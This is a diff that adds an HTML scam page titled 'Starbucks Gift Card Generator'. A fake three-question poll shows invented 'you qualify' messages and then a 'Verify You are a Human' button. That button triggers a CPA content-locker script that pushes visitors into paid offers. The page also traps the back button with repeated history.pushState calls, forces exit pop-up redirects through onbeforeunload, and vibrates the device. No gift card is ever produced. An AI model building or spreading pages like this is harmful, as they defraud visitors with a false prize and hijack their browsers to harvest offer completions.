@@ -1,0 +1,746 @@
+
+<!DOCTYPE html>
+<!--
+T: 2021-07-11 21:29:17
+Api: 3a683052faf8b7577cd1
+It: 1633441
+
+-->
+<html><head>
+    <title>Starbucks Gift Card Generator </title>
+<meta name="description" content="Starbucks Gift Card Generator "/>
+<meta property="og:title" content="Starbucks Gift Card Generator "/>
+<meta property="og:description" content="Starbucks Gift Card Generator "/>
+<meta name="referrer" content="no-referrer">
+
+<!-- Analytics -->
+
+<script
+        src="https://browser.sentry-cdn.com/6.4.1/bundle.min.js"
+        integrity="sha384-THoc7rflwZFKTdZNgv6jLFFDn299Uv3t1SW5B4yGLvLiCRTYP9ys6vXZcMl95TQF"
+        crossorigin="anonymous"
+></script>
+<script>
+    Sentry.init({
+        dsn: 'https://e0e6a104cb354a09bf094a90e676ea13@o425163.ingest.sentry.io/5780930',
+        tracesSampleRate: 0.01
+    });
+</script>
+<script>
+    (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r;
+        i[r] = i[r] || function () {
+            (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date();
+        a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+
+
+    
+    ga('send', 'pageview');
+
+</script>
+
+
+    <style>
+        .header_blue {
+            background: #1565c0;
+            padding: 80px 0 20px;
+            color: #fff;
+            font-size: 48px;
+            font-weight: 300;
+            margin-bottom: 40px;
+        }
+        .header_text {
+            margin-left: auto;
+            margin-right: auto;
+            width: 80%;
+        }
+        body{
+            margin:0;
+            font-family:Roboto, sans-serif;
+            color:#444;
+        }
+        .unlockBtn:hover{
+            box-shadow: 0 3px 6px rgba(0,0,0,.16), 0 3px 6px rgba(0,0,0,.23);
+        }
+        .unlockBtn {
+            background: #2196f3;
+            border: none;
+            border-radius: 2px;
+            box-shadow: 0 1px 3px rgba(0,0,0,.12), 0 1px 2px rgba(0,0,0,.24);
+            min-height: 31px;
+            min-width: 70px;
+            padding: 2px 16px;
+            text-align: center;
+            text-shadow: none;
+            text-transform: uppercase;
+            -webkit-transition: all 280ms ease;
+            transition: all 280ms ease;
+            box-sizing: border-box;
+            cursor: pointer;
+            -webkit-appearance: none;
+            display: inline-block;
+            vertical-align: middle;
+            font: 500 14px/31px Roboto,sans-serif!important;
+            outline: 0!important;
+            color:white;
+        }
+        .content-container{
+            width:80%;margin:0 auto;
+        }
+        @font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Pru33qjShpZSmG3z6VYwnRJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/oOeFwZNlrTefzLYmlVV1UBJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}
+        #q2,
+        #q3,
+        #q4,
+        #content2,
+        #content3,
+        #result1,
+        #result2,
+        #result3,
+        #comment1,
+        #comment2,
+        #comment3,
+        #comment4,
+        #comment5,
+        #comment6 {
+            display: none;
+        }
+        body {
+            text-align: center;
+            background-color: white;
+            font-family: 'Lato', sans-serif;
+            font-weight: 700;
+            margin: 0;
+            padding: 0;
+            background: white;
+        }
+        .header_container {
+            background-color: #003b64;
+        }
+        .footer {
+            font-size: 10px;
+            margin-top: 100px;
+        }
+        .header {
+            background: #003b64 no-repeat 10px center;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 0px;
+        }
+        .result {
+            margin: 0;
+            font-weight: bold;
+            padding: 5px 0 5px 25px;
+        }
+        hr {
+            border: 1px solid #fff;
+            width: 75%;
+            color: #fff;
+            margin: 0 auto;
+            padding: 0;
+        }
+        .header span {
+            color: #d7d7d7;
+        }
+        .content {
+            padding: 10px 10px;
+            max-width: 850px;
+            margin: 0 auto;
+        }
+        .dt {
+            font-size: 12px;
+            text-align: right;
+        }
+        .main-content {
+            padding: 5px;
+            background-color: #006241;
+            border: 3px solid silver;
+            -webkit-border-radius: 10px;
+            -moz-border-radius: 10px;
+            border-radius: 10px;
+            -webkit-box-shadow: -5px 8px 10px 5px rgba(0, 0, 0, 0.5);
+            -moz-box-shadow: -5px 8px 10px 5px rgba(0, 0, 0, 0.5);
+            box-shadow: -5px 8px 10px 5px rgba(0, 0, 0, 0.5);
+        }
+        .main-content h1 {
+            font-weight: 400;
+            text-align: center;
+            margin: 0;
+        }
+        .main-content h2 {
+            font-size: 1.5em;
+		
+            font-weight: 700;
+            font-weight: normal;
+        }
+        .main-content p {
+            font-size: 14px
+        }
+        .main-content span {
+            color: #F00;
+        }
+        .question {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        p.question {
+            font-size: 18px;
+        }
+        hr {
+            border: 1px solid #e62b1e!important;
+        }
+        .button {
+            background: #F3A847;
+            background: -moz-linear-gradient(top, #e74635 0%, #e62b1e 100%);
+            background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #2e74635), color-stop(100%, #e62b1e));
+            background: -webkit-linear-gradient(top, #e74635 0%, #e62b1e 100%);
+            background: -o-linear-gradient(top, #e74635 0%, #e62b1e 100%);
+            background: -ms-linear-gradient(top, #e74635 0%, #e62b1e 100%);
+            background: linear-gradient(to bottom, #e74635 0%, #e62b1e 100%);
+            filter: progid: DXImageTransform.Microsoft.gradient(startColorstr='#e74635', endColorstr='#e62b1e', GradientType=0);
+            text-align: center;
+            padding: 8px 0;
+            margin: 5px auto;
+            cursor: pointer;
+            max-width: 200px;
+            font-size: 15px;
+            color: #fff;
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+        }
+        .loading {
+            text-align: center;
+        }
+        p {
+            font-size: 16px!important;
+        }
+        .button2 {
+            background: -webkit-linear-gradient(#127fd2, #33a7e8);
+            background: -o-linear-gradient(#127fd2, #33a7e8);
+            background: -moz-linear-gradient(#127fd2, #33a7e8);
+            background: linear-gradient(#127fd2, #33a7e8);
+            text-align: center;
+            color: #fff;
+            font-size: 20px;
+            padding: 10px;
+            -webkit-border-radius: 20px;
+            -moz-border-radius: 20px;
+            border-radius: 20px;
+        }
+        a.claim {
+            color: #fff;
+            text-decoration: none;
+        }
+        .profile {
+            float: left;
+            width: 60px;
+            margin-right: 10px;
+            cursor: pointer;
+        }
+        .comments {
+            background-color: #eeeff4;
+            border-bottom: 2px solid #fff;
+            padding: 10px;
+        }
+        .profile img,
+        .comment-content img {} .comment-content {
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        .comment-content p {
+            padding-left: 70px;
+        }
+        .name {
+            font-weight: bold;
+            color: #3b5998;
+            margin: 0;
+            cursor: pointer;
+        }
+        .clr {
+            clear: both;
+        }
+        .comment-status {
+            font-size: 11px;
+            cursor: pointer;
+        }
+        .comment-status span {
+            color: #3b5998;
+        }
+        section.commentsfb .title {
+            display: inline-block;
+            margin-top: 20px;
+            margin-bottom: 26px
+        }
+        section.commentsfb .comment {
+            margin-bottom: 20px
+        }
+        section.commentsfb .comment .pic {
+            float: left;
+            display: table-cell
+        }
+        section.commentsfb .comment .contentcoment {
+            display: table-cell;
+            padding-left: 10px
+        }
+        section.commentsfb .comment .content {
+            margin-top: 3px;
+            margin-bottom: 7px
+        }
+        section.commentsfb .comment .date {
+            color: #9298a4;
+            font-size: 12px
+        }
+        section.commentsfb .comment .date span {
+            color: #8391b1
+        }
+        .fbcoms2.container {
+            font-family: Tahoma, Verdana, sans-serif;
+            background-color: #fff;
+            border: 1px solid #c3c4ca;
+            margin-top: 10px;
+            border-radius: 5px;
+            overflow: hidden;
+            padding: 0;
+            font-size: 12px;
+            text-align: left;
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box
+        }
+        .comments {
+            font-weight: 700;
+            text-align: center;
+            padding: 0 5px 10px
+        }
+        .totlikes {
+            margin-top: 3px;
+            background-color: #eeeff4;
+            padding: 5px 10px;
+            background-repeat: no-repeat;
+            background-position: 5px center
+        }
+        .fbblue {
+            color: #3c5a96
+        }
+        .buttons {
+            padding-bottom: 0;
+            margin-bottom: 7px;
+            margin-top: 7px;
+            padding-left: 10px;
+            font-family: Arial, sans-serif;
+            color: #7d7d7f
+        }
+        .buttons span {
+            cursor: pointer
+        }
+        .buttons span:hover {
+            text-decoration: underline
+        }
+        .viewmore {
+            margin-top: 3px;
+            background-color: #eeeff4;
+            padding: 5px 10px;
+            background-position: 5px center;
+            background-repeat: no-repeat;
+            overflow: hidden
+        }
+        .left {
+            cursor: pointer;
+            float: left;
+            color: #3c5a96
+        }
+        .left:hover {
+            text-decoration: underline
+        }
+        .right {
+            color: #7d7d7f;
+            float: right
+        }
+        .item {
+            position: relative;
+            margin-top: 3px;
+            background-color: #eeeff4;
+            padding: 5px 5px 5px 65px;
+            min-height: 60px;
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+            width: 100%!important
+        }
+        .item .profileimg {
+            position: absolute;
+            top: 5px;
+            left: 10px
+        }
+        .comtxt {
+            line-height: 16px;
+            margin-top: 0
+        }
+        .name {
+            color: #3c5a96;
+            font-weight: 700
+        }
+        .ago {
+            color: #86878c;
+            font-size: .95em
+        }
+        .fblike {
+            color: #3c5a96;
+            font-size: .95em;
+            cursor: pointer
+        }
+        .fblike:hover {
+            text-decoration: underline
+        }
+        .combot {
+            padding-top: 5px
+        }
+        .clickhere {
+            font-weight: 700;
+            padding: 30px 10px 5px;
+            line-height: 18px
+        }
+        .likes {
+            color: #3c5a96;
+            font-size: .95em;
+            cursor: pointer
+        }
+        .button {
+            font-size: 24px;
+        }
+        .question {
+            font-size: 26px!important;
+        }
+        .fbimg {
+            background-color: #fff;
+            border-radius: 2px;
+            -moz-border-radius: 2px;
+            -webkit-border-radius: 2px;
+            max-width: 210px;
+            width: 100%;
+            padding: 3px;
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+            border: 1px solid gray;
+            margin: 10px 0 5px
+        }
+        .hidden {
+            display: none;
+            opacity: 0
+        }
+        .hidden .comtxt,
+        .hidden .combot,
+        .comments {
+            display: none
+        }
+        .result {
+            text-align: left!important;
+        }
+		.mfp-hide
+		{
+			display:none;
+		}
+		.final
+		{
+			padding: 5px;
+            background-color: white;
+            border: 3px solid silver;
+            -webkit-border-radius: 10px;
+            -moz-border-radius: 10px;
+            border-radius: 10px;
+            -webkit-box-shadow: -5px 8px 10px 5px rgba(0, 0, 0, 0.5);
+            -moz-box-shadow: -5px 8px 10px 5px rgba(0, 0, 0, 0.5);
+            box-shadow: -5px 8px 10px 5px rgba(0, 0, 0, 0.5);
+			height: 300px;
+			width: 500px;
+			margin:auto;
+			margin-top: 30px;
+		}
+		.button {
+  background-color: #4CAF50; /* Green */
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+.br
+{
+	color:white;
+}
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<head>
+    <base href="">
+
+    <script type="text/javascript">
+		
+        speak("Congratulations!");
+     
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        }
+     
+        function gourl() {
+            location.replace(redirurl, '_blank');
+        }
+     
+        function exit_a1() {
+            window.onbeforeunload = null;
+            window.location = redirurl;
+            window.open(redirurl, '_blank');
+            PreventExitSplash = !0;
+            return false;
+        }
+    </script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0">
+    <meta content="" name="keywords">
+    <meta content="" name="description">
+
+    <title style="color:white">Starbucks Gift Card Generator</title>
+
+    <script type="text/javascript" src="js/jquery.min.js"></script>
+	<link rel="stylesheet" href="css/style.css" type="text/css" media="all">
+	<script type="text/javascript">
+    var CPABUILDSETTINGS={"it":481269,"key":"c2a60"};
+</script>
+<script src="https://d13nu0oomnx5ti.cloudfront.net/05e1754.js"></script>
+<link rel="shortcut icon" href="favicon.ico" type="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1625226009ee634dc3c6e40a9349cb8e2518cac1a9.jpg/>
+
+</head>
+
+<body style="">
+    <style>
+        
+    </style>
+    <div class="header_container">
+        <div class="header"></div>
+    </div>
+    <div class="content">
+        <div class="main-content" id="content1">
+            <div style="max-width:400px;margin:0 auto;"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1625315343e9c05c4360f5126ed061cabd7d21448e.png">
+            </div>
+            <h1 style="color:white">
+       <script>document.write(getURLParameter('brand'))</script><script>document.write(getURLParameter('model'))</script><strong>Starbucks Gift Card<sup>®</sup> Genrator</strong>!
+
+    </h1>
+            <h2 style="color:white">
+
+Answer the poll to generate Starbucks Gift Card!                  
+    </h2>
+            <hr>
+            <br>
+            <br>
+            <div id="q1" align="center">
+                <p class="question"><strong style="color:white">
+         Question 1 of 3                                       
+        </strong><br>
+		
+                    <strong style="color:#E8AF2C"> Are you male or female?
+                </strong>
+                <br>
+                <div class="button bq1">
+                    Male
+                </div>
+                <div class="button bq1">
+                    Female
+                </div>
+            </div>
+            <div id="q2" align="center">
+                <p class="question"><strong style="color:white">
+          Question 2 of 3                              
+        </strong>
+                   <br>
+					<strong style="color:#E8AF2C"> How Old Are U?
+                </strong>
+                <br>
+                </p>
+				
+                <br>
+                <div class="button bq2">
+                    18-29
+                </div>
+                <div class="button bq2">
+                    30-39
+                </div>
+                <div class="button bq2">
+                    40-49
+                </div>
+                <div class="button bq2">
+                    50+
+                </div>
+            </div>
+            <div id="q3" align="center">
+                <p class="question"><strong style="color:white">
+          Question 3 of 3                              
+        </strong>
+                    <br> 
+					<strong style="color:#E8AF2C"> Do you shop online?
+                </strong>
+                <br>
+                </p>
+                <br>
+                <div class="button bq4">
+                    Yes
+                </div>
+                <div class="button bq4">
+                    No
+                </div>
+            </div>
+        </div>
+        <div class="main-content" id="content2">
+            <h1 style="text-align:center ">
+      <strong style="color:white">Submitting Answers...  </strong>              
+    </h1>
+            <p class="loading"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/16251153292b6cb0ee40be7a5dbaa152731bc98de2.gif">
+            </p>
+
+            <div style="max-width:320px;margin:0 auto;">
+                <p class="result" id="result1" style="color:white">
+                    ✔Analyzing Results...
+                </p>
+                <p class="result" id="result2" style="color:white">
+                    ✔National Consumer Center you qualify!
+                </p>
+                <p class="result" id="result3" style="color:white">
+                    ✔Redirecting to prize page...
+                </p>
+				
+            </div>
+            <a class="" onclick="exit_a1();PreventExitPop = true"></a>
+			<!--div style="max-width:200px;margin:0 auto;">
+					<h2>Read to Goooooooooooo</h2>
+					
+					
+				</div-->
+				
+        </div>
+		<div class="final mfp-hide" style="background-color:#006241">
+		<br>
+		
+			<h2 style="margin-top:80px" ><strong style="color:white">Yeyyyy! Your Starbux Gift Card is ready!!!</strong></h2>
+			<h3 style="color:#E8AF2C">Verify You are a Human Being Not a Bot</h3>
+			<button class="button" type="button" onclick="CPABuildLock()"><strong>Verify Now</strong></button>
+		</div>
+    </div>
+	
+<script src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/assets/1563194463bc66e25d79d63b124e302cf030d5249a.js"></script>
+    <script type="text/javascript">
+		
+        $(document).ready(function() {
+            $(".bq1").click(function() {
+                $("#q1").fadeOut(0);
+                $("#q2").fadeIn(500);
+            });
+            $(".bq2").click(function() {
+                $("#q2").fadeOut(0);
+                $("#q3").fadeIn(500);
+            });
+            $(".bq3").click(function() {
+                $("#q3").fadeOut(0);
+                $("#q4").fadeIn(500);
+            });
+            $(".bq4").click(function() {
+                $("#content1").fadeOut(0);
+                $("#content2").fadeIn();
+                setTimeout(function() {
+                    $("#result1").fadeIn(1000);
+                }, 3000);
+                setTimeout(function() {
+                    $("#result2").fadeIn(1000);
+                }, 4500);
+                setTimeout(function() {
+                    $("#result3").fadeIn(1000);
+                }, 6000);
+                setTimeout(function() {
+                    $("#content2").fadeOut();
+                }, 7500);
+                window.setTimeout(function() {
+                    $(".final").removeClass("mfp-hide");
+                    return false;
+                }, 7500);
+            });
+        });
+     
+       // alert(" Congratulate " + (getURLParameter('brand')) + " User !, yours " + (getURLParameter('model')) + " Has been randomly selected! You are the third lucky user " + (getURLParameter('city')) + "!\n\n Click OK ")
+     
+        ! function() {
+            var t;
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+                onpopstate = function(t) {
+                    PreventExitPop = false;
+                    t.state && location.replace(redirurl)
+                }
+            } catch (o) {}
+        }();
+     
+        var PreventExitPop = true;
+
+        function ExitPop() {
+            window.open(redirurl, '_blank');
+            if (PreventExitPop != false) {
+                return "WAIT!"
+            }
+        }
+        window.onbeforeunload = ExitPop;
+    </script>
+
+
+
+    <script type="text/javascript">
+        navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+        navigator.vibrate([1000, 500, 1000, 500]);
+    </script>
+
+</body>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var CPABUILDSETTINGS={"it":1637024,"key":"f8ada","testing":1};
+    var forward="";
+    CPABUILDSETTINGS.onComplete=function(data){
+        window.location=forward;
+        return false;
+    };
+</script>
+<script src="https://d13nu0oomnx5ti.cloudfront.net/a8820de.js"></script>
+<script type="text/javascript">
+    $('.showContentLocker').click(function(){
+       CPABuildLock();
+        return false;
+    });
+</script>
+<script>
+
+</script>
+<script type="text/javascript">
+    
+</script>
+<script>
+    if(typeof window.ga === 'function'){
+        ga('create', 'UA-85922709-2', 'auto', 'customTemplateGlobal');
+        ga('customTemplateGlobal.set', 'dimension1', typeof window.CPBContentLocker === 'function' ? 0 : 1);
+        ga('customTemplateGlobal.send', 'pageView');
+    }
+
+
+</script>
+</body>
+</html>
